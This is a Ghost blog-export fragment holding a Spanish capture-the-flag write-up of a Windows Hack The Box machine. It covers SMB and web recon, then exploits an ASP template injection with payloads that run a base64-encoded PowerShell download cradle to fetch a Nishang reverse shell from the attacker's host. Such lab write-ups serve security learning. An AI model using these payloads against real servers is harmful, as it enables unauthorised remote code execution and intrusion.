NMAP con el fin de encontrar algún tipo de vulnerabilidad inicial. \"]]],[10,1],[1,\"h3\",[[0,[],0,\"SAMBA\"]]],[1,\"p\",[[0,[],0,\"Vemos un par de puertos interesantes por donde vamos a empezar a revisar cosas que son el 443 y el 445.  Vamos a empezar con este último, de \"],[0,[0],1,\"smb\"],[0,[],0,\", para ver que información de la máquina sacamos rápidamente con Crackmapexec.\"]]],[10,2],[1,\"p\",[[0,[],0,\"Del comando superior recogemos que estamos ante una máquina con \"],[0,[0],1,\"Win10\"],[0,[],0,\", con nombre \"],[0,[0],1,\"EARTH\"],[0,[],0,\", perteneciente al dominio \"],[0,[0],1,\"windcorp.htb \"],[0,[],0,\"y con smb firmado, por lo que no podremos aprovecharnos de vulnerabilidades existentes en aquellos entornos que no requieren firma.\"]]],[1,\"p\",[[0,[],0,\"Con el siguiente comando, tratamos de enumerar posibles directorios de red compartidos que sean públicos.\"]]],[10,3],[1,\"p\",[[0,[],0,\"Por último, compruebo utilizando una herramienta alternativa, denominada \"],[0,[0],1,\"smbclient \"],[0,[],0,\"para intentar por última vez listar recursos compartidos aprovechandonos de un \"],[0,[1],1,\"null session\"],[0,[],0,\".\"]]],[10,4],[1,\"p\",[[0,[],0,\"Poco más podemos hacer por aquí.\"]]],[1,\"h2\",[[0,[],0,\"IIS\"]]],[1,\"p\",[[0,[],0,\"Continuamos con el servidor web con certificado \"],[0,[0],1,\"https.\"],[0,[],0,\" Conviene apuntarnos en \"],[0,[0],1,\"/etc/hosts\"],[0,[],0,\" el dominio \"],[0,[0],1,\"www.windcorp.htb\"],[0,[],0,\" y \"],[0,[0],1,\"windcorp.htb\"],[0,[],0,\" por si estuviésemos ante una máquina con virtual hosting.\"]]],[1,\"p\",[[0,[],0,\"Podemos hacer una prueba rápida para verificar esto utilizando CURL con el parámetro \"],[0,[0],1,\"-k\"],[0,[],0,\" para no tener problemas ante posibles certificados autofirmados.\"]]],[10,5],[1,\"p\",[[0,[],0,\"Si tratamos de acceder al servidor directamente con la IP nos arroja un estado HTTP 404 mientras que con el dominio somos capaces de llegar a la página.\"]]],[10,6],[1,\"p\",[[0,[],0,\"Examinamos con \"],[0,[0],1,\"openssl \"],[0,[],0,\"el certificado de manera más detallada por si arrojase más información relevante.\"]]],[10,7],[1,\"p\",[[0,[],0,\"Volvemos a ver el subdominio \"],[0,[0],1,\"www\"],[0,[],0,\". Lanzamos un \"],[0,[0],1,\"whatweb \"],[0,[],0,\"para ver si llegamos a ver información de interés.\"]]],[10,8],[1,\"p\",[[0,[],0,\"Vemos que está un \"],[0,[2],1,\"Internet Information Services\"],[0,[],0,\" de Microsoft como servidor por lo que podemos deducir que los tipos de lenguaje que interpreta el servidor estarán relacionados con ASP.NET. Vamos a volver a examinar la página.\"]]],[1,\"p\",[[0,[],0,\"Nos encontramos ante un formulario.\"]]],[10,9],[1,\"p\",[[0,[],0,\"Si introducimos información en él y le damos a \"],[0,[0],1,\"Send Message\"],[0,[],0,\", nos encontramos la siguiente página.\"]]],[10,10],[1,\"p\",[[0,[],0,\"La información que hemos escrito en la página anterior es exactamente la que visualizamos una vez pulsamos el primer botón. Hay muchas probabilidades de que nos estemos encontrando ante un \"],[0,[3],1,\"Server Side Template Injection\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[],0,\"Vamos a comprobarlo volviendo a la página anterior, introduciendo unos nuevos valores y volviendo a pulsar el botón.\"]]],[10,11],[1,\"p\",[[0,[],0,\"¿5x5? 😎 Exacto, 25.\"]]],[10,12],[1,\"p\",[[0,[],0,\"Lo que ha sucedido es que hemos conseguido inyectar código y el servidor ha interpretado el resultado. En este caso, el código del servidor no limpia el input del usuario y permite ejecutar directamente en su plantilla lo introducido anteriormente. Esto no es algo único de ASP. Este tipo de vulnerabilidades se pueden dar (y se dan) en cualquier lenguaje que tenga un motor de renderizado de plantillas como puede ser Jinja2 u otros.\"]]],[1,\"p\",[[0,[],0,\"Encontramos un modo de ejecutar código desde una shell \"],[0,[4],1,\"aquí\"],[0,[],0,\".\"]]],[10,13],[1,\"p\",[[0,[],0,\"Pero necesitamos una manera de entablar una reverse shell desde Windows, que no es tan trivial como en Linux con Bash. En el repositorio de Nishang, cogemos \"],[0,[5],1,\"esta\"],[0,[],0,\" reverse shell. La idea es cambiar el script de arriba de tal modo que primero nos descarguemos el script a la máquina remota.\"]]],[10,14],[1,\"p\",[[0,[],0,\"Siempre que lidiamos con comillas dobles, comillas simples, etc, es mejor encodear el contenido en base64 y tratar de transmitir la información de esa forma. Además, Powershell permite ejecutar código en base64 pasándole el parámetro -e, por lo que vamos a tratar de cambiar primero el comando de arriba un poco. Cosas a tener en consideración según \"],[0,[6],1,\"Microsoft\"],[0,[],0,\".\"]]],[1,\"blockquote\",[[0,[],0,\"En general, Windows PowerShell tiene configurada la codificación UNICODE \"],[0,[7],1,\"UTF-16LE\"],[0,[],0,\" de forma predeterminada.\"]]],[1,\"p\",[[0,[],0,\"Para ello, ejecutamos el siguiente código.\"]]],[10,15],[1,\"p\",[[0,[],0,\"Básicamente, lo que hacemos cambiando el encoding a utf-16le, es añadir esos puntos entre los caracteres si los visualizamos en formato hexadecimal. Pero a nosotros nos interesa el contenido en base64, por lo que nos quedamos con el último output del mensaje.\"]]],[1,\"p\",[[0,[],0,\"Para ello, ponemos un servidor en escucha en nuestra máquina y \"],[0,[0],1,\"netcat \"],[0,[],0,\"en el 443 (con \"],[0,[0],1,\"rlwrap \"],[0,[],0,\"para poder usar los cursores en la nueva consola), puesto que se van a realizar las dos cosas al mismo tiempo.\"]]],[1,\"p\",[[0,[],0,\"Ponemos el script inferior en el formulario y ejecutamos.\"]]],[10,16],[10,17],[1,\"p\",[[0,[],0,\"Ya hemos ganado acceso a la máquina.\"]]],[1,\"p\",[[0,[],0,\"Con un par de comandos como ipconfig y ls C: nos damos cuenta de que estamos en un contenedor.\"]]],[10,18],[1,\"p\",[[0,[],0,\"Podríamos asegurarnos una TTY interactiva utlizando una utilidad de AntonioCoco que tenemos en su repositorio llamada \"],[0,[8],1,\"ConPtyShell\"],[0,[],0,\" pero como la máquina es larga, vamos a saltarnos este paso.\"]]],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>Esta máquina es diferente al resto. Su nivel es Insane y creo que es perfecta para aprender cada detalle de como progresamos en ella. Tiene además Windows instalado y toca aspectos de contenedores. Vamos a ello.</p><p>Iniciamos el proceso validando la comunicación con mediante un Ping donde observamos además su TTL~127 por lo que se deduce que esta Windows ejecutandose en su interior.</p><p>Escaneamos los puertos con nmap.</p><pre><code class=\"language-sh\">nmap -p- --open -sS -T5 -v -n -Pn 10.10.11.102 -oG allPorts</code></pre><p>Tratamos de enumerar las versiones de los puertos que tiene abiertos así como ejecutar varios scripts de reconocimiento básicos de NMAP con el fin de encontrar algún tipo de vulnerabilidad inicial. </p><pre><code class=\"language-sh\">nmap -p135,443,445,593,49711 -sCV 10.10.11.102 -oN targeted\nPORT      STATE SERVICE       VERSION\n135/tcp   open  msrpc         Microsoft Windows RPC\n443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n| ssl-cert: Subject: commonName=www.windcorp.htb\n| Subject Alternative Name: DNS:www.windcorp.htb\n| Not valid before: 2021-05-24T19:44:56\n|_Not valid after:  2031-05-24T19:54:56\n|_http-title: Not Found\n|_ssl-date: 2022-02-12T09:44:48+00:00; +1h00m01s from scanner time.\n|_http-server-header: Microsoft-HTTPAPI/2.0\n| tls-alpn: \n|_  http/1.1\n445/tcp   open  microsoft-ds?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49711/tcp open  msrpc         Microsoft Windows RPC\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3.1.1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2022-02-12T09:44:09\n|_  start_date: N/A\n|_clock-skew: mean: 1h00m00s, deviation: 0s, median: 59m59s</code></pre><h3 id=\"samba\">SAMBA</h3><p>Vemos un par de puertos interesantes por donde vamos a empezar a revisar cosas que son el 443 y el 445.  Vamos a empezar con este último, de <em>smb</em>, para ver que información de la máquina sacamos rápidamente con Crackmapexec.</p><pre><code class=\"language-sh\"> crackmapexec smb 10.10.11.102\nSMB         10.10.11.102    445    EARTH            [*] Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)</code></pre><p>Del comando superior recogemos que estamos ante una máquina con <em>Win10</em>, con nombre <em>EARTH</em>, perteneciente al dominio <em>windcorp.htb </em>y con smb firmado, por lo que no podremos aprovecharnos de vulnerabilidades existentes en aquellos entornos que no requieren firma.</p><p>Con el siguiente comando, tratamos de enumerar posibles directorios de red compartidos que sean públicos.</p><pre><code class=\"language-sh\">❯ smbmap -H 10.10.11.102\n[+] IP: 10.10.11.102:445\tName: www.windcorp.htb\n❯ smbmap -H 10.10.11.102 -u \"null\"\n[!] Authentication error on 10.10.11.102</code></pre><p>Por último, compruebo utilizando una herramienta alternativa, denominada <em>smbclient </em>para intentar por última vez listar recursos compartidos aprovechandonos de un <a href=\"https://en.wikipedia.org/wiki/Null_session\">null session</a>.</p><pre><code class=\"language-sh\">❯ smbclient -L 10.10.11.102 -N\nAnonymous login successful\n\tSharename       Type      Comment\n\t---------       ----      -------\nSMB1 disabled -- no workgroup available</code></pre><p>Poco más podemos hacer por aquí.</p><h2 id=\"iis\">IIS</h2><p>Continuamos con el servidor web con certificado <em>https.</em> Conviene apuntarnos en <em>/etc/hosts</em> el dominio <em>www.windcorp.htb</em> y <em>windcorp.htb</em> por si estuviésemos ante una máquina con virtual hosting.</p><p>Podemos hacer una prueba rápida para verificar esto utilizando CURL con el parámetro <em>-k</em> para no tener problemas ante posibles certificados autofirmados.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-sh\">❯ curl -I -X GET https://10.10.11.102 -k\nHTTP/2 404 \n...\n\n❯ curl -I -X GET https://www.windcorp.htb -k\nHTTP/2 200 \n...\n</code></pre><figcaption>..</figcaption></figure><p>Si tratamos de acceder al servidor directamente con la IP nos arroja un estado HTTP 404 mientras que con el dominio somos capaces de llegar a la página.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image-8.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"775\" height=\"482\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/02/image-8.png 600w, __GHOST_URL__/content/images/2022/02/image-8.png 775w\" sizes=\"(min-width: 720px) 720px\"></figure><p>Examinamos con <em>openssl </em>el certificado de manera más detallada por si arrojase más información relevante.</p><pre><code class=\"language-sh\">❯ openssl s_client --connect windcorp.htb:443\nCONNECTED(00000003)\ndepth=0 CN = www.windcorp.htb\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 CN = www.windcorp.htb\nverify return:1\n---\nCertificate chain\n 0 s:CN = www.windcorp.htb\n   i:CN = www.windcorp.htb\n</code></pre><p>Volvemos a ver el subdominio <em>www</em>. Lanzamos un <em>whatweb </em>para ver si llegamos a ver información de interés.</p><pre><code class=\"language-sh\">❯ whatweb https://www.windcorp.htb\nhttps://www.windcorp.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@example.com,contact@windcorp.htb], Frame, HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.102], Lightbox, Microsoft-IIS[10.0], Script, Title[Windcorp - Index] </code></pre><p>Vemos que está un <a href=\"https://es.wikipedia.org/wiki/Internet_Information_Services\">Internet Information Services</a> de Microsoft como servidor por lo que podemos deducir que los tipos de lenguaje que interpreta el servidor estarán relacionados con ASP.NET. Vamos a volver a examinar la página.</p><p>Nos encontramos ante un formulario.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image-9.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"723\" height=\"702\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/02/image-9.png 600w, __GHOST_URL__/content/images/2022/02/image-9.png 723w\" sizes=\"(min-width: 720px) 720px\"></figure><p>Si introducimos información en él y le damos a <em>Send Message</em>, nos encontramos la siguiente página.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image-10.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"465\" height=\"259\"></figure><p>La información que hemos escrito en la página anterior es exactamente la que visualizamos una vez pulsamos el primer botón. Hay muchas probabilidades de que nos estemos encontrando ante un <a href=\"https://portswigger.net/web-security/server-side-template-injection\">Server Side Template Injection</a>.</p><p>Vamos a comprobarlo volviendo a la página anterior, introduciendo unos nuevos valores y volviendo a pulsar el botón.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image-13.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"735\" height=\"292\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/02/image-13.png 600w, __GHOST_URL__/content/images/2022/02/image-13.png 735w\" sizes=\"(min-width: 720px) 720px\"></figure><p>¿5x5? 😎 Exacto, 25.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image-14.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"437\" height=\"261\"></figure><p>Lo que ha sucedido es que hemos conseguido inyectar código y el servidor ha interpretado el resultado. En este caso, el código del servidor no limpia el input del usuario y permite ejecutar directamente en su plantilla lo introducido anteriormente. Esto no es algo único de ASP. Este tipo de vulnerabilidades se pueden dar (y se dan) en cualquier lenguaje que tenga un motor de renderizado de plantillas como puede ser Jinja2 u otros.</p><p>Encontramos un modo de ejecutar código desde una shell <a href=\"https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html\">aquí</a>.</p><pre><code class=\"language-sh\">&lt;%response.write CreateObject(\"WScript.Shell\").Exec(\"ping 10.10.14.21\").StdOut.Readall()%&gt;\n</code></pre><p>Pero necesitamos una manera de entablar una reverse shell desde Windows, que no es tan trivial como en Linux con Bash. En el repositorio de Nishang, cogemos <a href=\"https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1\">esta</a> reverse shell. La idea es cambiar el script de arriba de tal modo que primero nos descarguemos el script a la máquina remota.</p><pre><code class=\"language-sh\">&lt;%response.write CreateObject(\"WScript.Shell\").Exec(\"cmd /c powershell IEC(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')\").StdOut.Readall()%&gt;</code></pre><p>Siempre que lidiamos con comillas dobles, comillas simples, etc, es mejor encodear el contenido en base64 y tratar de transmitir la información de esa forma. Además, Powershell permite ejecutar código en base64 pasándole el parámetro -e, por lo que vamos a tratar de cambiar primero el comando de arriba un poco. Cosas a tener en consideración según <a href=\"https://docs.microsoft.com/es-es/powershell/module/microsoft.powershell.core/about/about_character_encoding?view=powershell-7.2\">Microsoft</a>.</p><blockquote>En general, Windows PowerShell tiene configurada la codificación UNICODE <a href=\"https://wikipedia.org/wiki/UTF-16\">UTF-16LE</a> de forma predeterminada.</blockquote><p>Para ello, ejecutamos el siguiente código.</p><pre><code class=\"language-sh\">❯ echo \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')\"&gt;data\n❯ cat data | iconv -t utf-16le | xxd\n00000000: 4900 4500 5800 2800 4e00 6500 7700 2d00  I.E.X.(.N.e.w.-.\n00000010: 4f00 6200 6a00 6500 6300 7400 2000 4e00  O.b.j.e.c.t. .N.\n00000020: 6500 7400 2e00 5700 6500 6200 4300 6c00  e.t...W.e.b.C.l.\n00000030: 6900 6500 6e00 7400 2900 2e00 6400 6f00  i.e.n.t.)...d.o.\n00000040: 7700 6e00 6c00 6f00 6100 6400 5300 7400  w.n.l.o.a.d.S.t.\n00000050: 7200 6900 6e00 6700 2800 2700 6800 7400  r.i.n.g.(.'.h.t.\n00000060: 7400 7000 3a00 2f00 2f00 3100 3000 2e00  t.p.:././.1.0...\n00000070: 3100 3000 2e00 3100 3400 2e00 3200 3100  1.0...1.4...2.1.\n00000080: 2f00 5000 5300 2e00 7000 7300 3100 2700  /.P.S...p.s.1.'.\n00000090: 2900 0a00                                )...\n❯ cat data | iconv -t utf-16le | base64 -w0; echo\nSQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA==</code></pre><p>Básicamente, lo que hacemos cambiando el encoding a utf-16le, es añadir esos puntos entre los caracteres si los visualizamos en formato hexadecimal. Pero a nosotros nos interesa el contenido en base64, por lo que nos quedamos con el último output del mensaje.</p><p>Para ello, ponemos un servidor en escucha en nuestra máquina y <em>netcat </em>en el 443 (con <em>rlwrap </em>para poder usar los cursores en la nueva consola), puesto que se van a realizar las dos cosas al mismo tiempo.</p><p>Ponemos el script inferior en el formulario y ejecutamos.</p><pre><code class=\"language-sh\">&lt;%response.write CreateObject(\"WScript.Shell\").Exec(\"cmd /c powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA==\").StdOut.Readall()%&gt;</code></pre><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image-16.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"750\" height=\"376\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/02/image-16.png 600w, __GHOST_URL__/content/images/2022/02/image-16.png 750w\" sizes=\"(min-width: 720px) 720px\"></figure><p>Ya hemos ganado acceso a la máquina.</p><p>Con un par de comandos como ipconfig y ls C: nos damos cuenta de que estamos en un contenedor.</p><pre><code class=\"language-sh\">❯ ipconfig\nWindows IP Configuration\nEthernet adapter vEthernet (Ethernet):\n\n   Connection-specific DNS Suffix  . : htb\n   Link-local IPv6 Address . . . . . : fe80::9d2d:a5ec:4bd2:b52d%32\n   IPv4 Address. . . . . . . . . . . : 172.22.47.185\n   Subnet Mask . . . . . . . . . . . : 255.255.240.0\n   Default Gateway . . . . . . . . . : 172.22.32.1\n   \n❯ ls C:\\\n    Directory: C:\\\nMode                LastWriteTime         Length Name                         \n----                -------------         ------ ----                         \nd-----        4/25/2021  11:23 PM                inetpub                     \nd-r---        5/24/2021  10:49 PM                Program Files\nd-----         4/9/2021  10:34 PM                Program Files (x86)\nd-r---         4/9/2021  10:37 PM                Users\nd-----        4/26/2021  12:32 AM                Windows</code></pre><p>Podríamos asegurarnos una TTY interactiva utlizando una utilidad de AntonioCoco que tenemos en su repositorio llamada <a href=\"https://github.com/antonioCoco/ConPtyShell\">ConPtyShell</a> pero como la máquina es larga, vamos a saltarnos este paso.</p>",
            "comment_id": "62076e925a95d40061bbb94b",
            "plaintext": "Esta máquina es diferente al resto. Su nivel es Insane y creo que es perfecta para aprender cada detalle de como progresamos en ella. Tiene además Windows instalado y toca aspectos de contenedores. Vamos a ello.\n\nIniciamos el proceso validando la comunicación con mediante un Ping donde observamos además su TTL~127 por lo que se deduce que esta Windows ejecutandose en su interior.\n\nEscaneamos los puertos con nmap.\n\nnmap -p- --open -sS -T5 -v -n -Pn 10.10.11.102 -oG allPorts\n\nTratamos de enumerar las versiones de los puertos que tiene abiertos así como ejecutar varios scripts de reconocimiento básicos de NMAP con el fin de encontrar algún tipo de vulnerabilidad inicial.\n\nnmap -p135,443,445,593,49711 -sCV 10.10.11.102 -oN targeted\nPORT      STATE SERVICE       VERSION\n135/tcp   open  msrpc         Microsoft Windows RPC\n443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n| ssl-cert: Subject: commonName=www.windcorp.htb\n| Subject Alternative Name: DNS:www.windcorp.htb\n| Not valid before: 2021-05-24T19:44:56\n|_Not valid after:  2031-05-24T19:54:56\n|_http-title: Not Found\n|_ssl-date: 2022-02-12T09:44:48+00:00; +1h00m01s from scanner time.\n|_http-server-header: Microsoft-HTTPAPI/2.0\n| tls-alpn: \n|_  http/1.1\n445/tcp   open  microsoft-ds?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49711/tcp open  msrpc         Microsoft Windows RPC\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3.1.1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2022-02-12T09:44:09\n|_  start_date: N/A\n|_clock-skew: mean: 1h00m00s, deviation: 0s, median: 59m59s\n\n\nSAMBA\n\nVemos un par de puertos interesantes por donde vamos a empezar a revisar cosas que son el 443 y el 445.  Vamos a empezar con este último, de smb, para ver que información de la máquina sacamos rápidamente con Crackmapexec.\n\n crackmapexec smb 10.10.11.102\nSMB         10.10.11.102    445    EARTH            [*] Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)\n\nDel comando superior recogemos que estamos ante una máquina con Win10, con nombre EARTH, perteneciente al dominio windcorp.htb y con smb firmado, por lo que no podremos aprovecharnos de vulnerabilidades existentes en aquellos entornos que no requieren firma.\n\nCon el siguiente comando, tratamos de enumerar posibles directorios de red compartidos que sean públicos.\n\n❯ smbmap -H 10.10.11.102\n[+] IP: 10.10.11.102:445\tName: www.windcorp.htb\n❯ smbmap -H 10.10.11.102 -u \"null\"\n[!] Authentication error on 10.10.11.102\n\nPor último, compruebo utilizando una herramienta alternativa, denominada smbclient para intentar por última vez listar recursos compartidos aprovechandonos de un null session.\n\n❯ smbclient -L 10.10.11.102 -N\nAnonymous login successful\n\tSharename       Type      Comment\n\t---------       ----      -------\nSMB1 disabled -- no workgroup available\n\nPoco más podemos hacer por aquí.\n\n\nIIS\n\nContinuamos con el servidor web con certificado https. Conviene apuntarnos en /etc/hosts el dominio www.windcorp.htb y windcorp.htb por si estuviésemos ante una máquina con virtual hosting.\n\nPodemos hacer una prueba rápida para verificar esto utilizando CURL con el parámetro -k para no tener problemas ante posibles certificados autofirmados.\n\n❯ curl -I -X GET https://10.10.11.102 -k\nHTTP/2 404 \n...\n\n❯ curl -I -X GET https://www.windcorp.htb -k\nHTTP/2 200 \n...\n\n\nSi tratamos de acceder al servidor directamente con la IP nos arroja un estado HTTP 404 mientras que con el dominio somos capaces de llegar a la página.\n\nExaminamos con openssl el certificado de manera más detallada por si arrojase más información relevante.\n\n❯ openssl s_client --connect windcorp.htb:443\nCONNECTED(00000003)\ndepth=0 CN = www.windcorp.htb\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 CN = www.windcorp.htb\nverify return:1\n---\nCertificate chain\n 0 s:CN = www.windcorp.htb\n   i:CN = www.windcorp.htb\n\n\nVolvemos a ver el subdominio www. Lanzamos un whatweb para ver si llegamos a ver información de interés.\n\n❯ whatweb https://www.windcorp.htb\nhttps://www.windcorp.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@example.com,contact@windcorp.htb], Frame, HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.102], Lightbox, Microsoft-IIS[10.0], Script, Title[Windcorp - Index] \n\nVemos que está un Internet Information Services de Microsoft como servidor por lo que podemos deducir que los tipos de lenguaje que interpreta el servidor estarán relacionados con ASP.NET. Vamos a volver a examinar la página.\n\nNos encontramos ante un formulario.\n\nSi introducimos información en él y le damos a Send Message, nos encontramos la siguiente página.\n\nLa información que hemos escrito en la página anterior es exactamente la que visualizamos una vez pulsamos el primer botón. Hay muchas probabilidades de que nos estemos encontrando ante un Server Side Template Injection.\n\nVamos a comprobarlo volviendo a la página anterior, introduciendo unos nuevos valores y volviendo a pulsar el botón.\n\n¿5x5? 😎 Exacto, 25.\n\nLo que ha sucedido es que hemos conseguido inyectar código y el servidor ha interpretado el resultado. En este caso, el código del servidor no limpia el input del usuario y permite ejecutar directamente en su plantilla lo introducido anteriormente. Esto no es algo único de ASP. Este tipo de vulnerabilidades se pueden dar (y se dan) en cualquier lenguaje que tenga un motor de renderizado de plantillas como puede ser Jinja2 u otros.\n\nEncontramos un modo de ejecutar código desde una shell aquí.\n\n<%response.write CreateObject(\"WScript.Shell\").Exec(\"ping 10.10.14.21\").StdOut.Readall()%>\n\n\nPero necesitamos una manera de entablar una reverse shell desde Windows, que no es tan trivial como en Linux con Bash. En el repositorio de Nishang, cogemos esta reverse shell. La idea es cambiar el script de arriba de tal modo que primero nos descarguemos el script a la máquina remota.\n\n<%response.write CreateObject(\"WScript.Shell\").Exec(\"cmd /c powershell IEC(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')\").StdOut.Readall()%>\n\nSiempre que lidiamos con comillas dobles, comillas simples, etc, es mejor encodear el contenido en base64 y tratar de transmitir la información de esa forma. Además, Powershell permite ejecutar código en base64 pasándole el parámetro -e, por lo que vamos a tratar de cambiar primero el comando de arriba un poco. Cosas a tener en consideración según Microsoft.\n\nEn general, Windows PowerShell tiene configurada la codificación UNICODE UTF-16LE de forma predeterminada.\n\nPara ello, ejecutamos el siguiente código.\n\n❯ echo \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')\">data\n❯ cat data | iconv -t utf-16le | xxd\n00000000: 4900 4500 5800 2800 4e00 6500 7700 2d00  I.E.X.(.N.e.w.-.\n00000010: 4f00 6200 6a00 6500 6300 7400 2000 4e00  O.b.j.e.c.t. .N.\n00000020: 6500 7400 2e00 5700 6500 6200 4300 6c00  e.t...W.e.b.C.l.\n00000030: 6900 6500 6e00 7400 2900 2e00 6400 6f00  i.e.n.t.)...d.o.\n00000040: 7700 6e00 6c00 6f00 6100 6400 5300 7400  w.n.l.o.a.d.S.t.\n00000050: 7200 6900 6e00 6700 2800 2700 6800 7400  r.i.n.g.(.'.h.t.\n00000060: 7400 7000 3a00 2f00 2f00 3100 3000 2e00  t.p.:././.1.0...\n00000070: 3100 3000 2e00 3100 3400 2e00 3200 3100  1.0...1.4...2.1.\n00000080: 2f00 5000 5300 2e00 7000 7300 3100 2700  /.P.S...p.s.1.'.\n00000090: 2900 0a00                                )...\n❯ cat data | iconv -t utf-16le | base64 -w0; echo\nSQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA==\n\nBásicamente, lo que hacemos cambiando el encoding a utf-16le, es añadir esos puntos entre los caracteres si los visualizamos en formato hexadecimal. Pero a nosotros nos interesa el contenido en base64, por lo que nos quedamos con el último output del mensaje.\n\nPara ello, ponemos un servidor en escucha en nuestra máquina y netcat en el 443 (con rlwrap para poder usar los cursores en la nueva consola), puesto que se van a realizar las dos cosas al mismo tiempo.\n\nPonemos el script inferior en el formulario y ejecutamos.\n\n<%response.write CreateObject(\"WScript.Shell\").Exec(\"cmd /c powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA==\").StdOut.Readall()%>\n\nYa hemos ganado acceso a la máquina.\n\nCon un par de comandos como ipconfig y ls C: nos damos cuenta de que estamos en un contenedor.\n\n❯ ipconfig\nWindows IP Configuration\nEthernet adapter vEthernet (Ethernet):\n\n   Connection-specific DNS Suffix  . : htb\n   Link-local IPv6 Address . . . . . : fe80::9d2d:a5ec:4bd2:b52d%32\n   IPv4 Address. . . . . . . . . . . : 172.22.47.185\n   Subnet Mask . . . . . . . . . . . : 255.255.240.0\n   Default Gateway . . . . . . . . . : 172.22.32.1\n   \n❯ ls C:\\\n    Directory: C:\\\nMode                LastWriteTime         Length Name                         \n----                -------------         ------ ----                         \nd-----        4/25/2021  11:23 PM                inetpub                     \nd-r---        5/24/2021  10:49 PM                Program Files\nd-----         4/9/2021  10:34 PM                Program Files (x86)\nd-r---         4/9/2021  10:37 PM                Users\nd-----        4/26/2021  12:32 AM                Windows\n\nPodríamos asegurarnos una TTY interactiva utlizando una utilidad de AntonioCoco que tenemos en su repositorio llamada ConPtyShell pero como la máquina es larga, vamos a saltarnos este paso.",
            "feature_image": "__GHOST_URL__/content/images/2022/02/anubis.png",
            "featured": 0,
            "type": "post",
            "status": "draft",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2022-02-12T08:23:46.000Z",
            "updated_at": "2022-02-13T18:45:55.000Z",
            "published_at": null,
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63a223c1005753014811237d",
            "uuid": "b559e9d4-bfd6-44a4-9eed-a8db8e80a4e0",
            "title": "CTF - Jeeves WriteUp",
            "slug": "ctf-jeeves",
